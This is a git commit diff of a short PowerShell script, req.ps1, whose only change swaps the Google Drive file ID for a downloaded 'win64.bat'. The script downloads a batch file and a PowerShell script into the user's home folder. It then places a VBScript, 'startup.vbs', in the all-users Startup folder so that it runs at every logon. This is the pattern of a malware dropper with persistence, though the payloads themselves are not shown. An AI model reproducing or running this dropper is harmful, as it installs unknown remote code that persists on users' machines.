a8ea7f5fe0413831af41878bd6106faf46749754
Tellertomate <147307692+Tellertomate@users.noreply.github.com>
2024-09-03 21:03:31 +0200

    Update req.ps1

--- req.ps1
+++ req.ps1
@@ -1,5 +1,5 @@
 cd C:\Users\$Env:UserName
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=10RZbkqEtOIArFu4NzlnMgtKuGsFrMwEr" -outfile "win64.bat"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1bK98ZA1aeVEWEVpygfopuwLtWfccsPpo" -outfile "win64.bat"
 Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1FFNPRwKOhMnO5lDxXO3XaUhkZPp31sfP" -outfile "user.ps1"
 cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1y0Z3z4JqElnSYiZXA5-G9jt7PKyUVXcN" -outfile "startup.vbs"
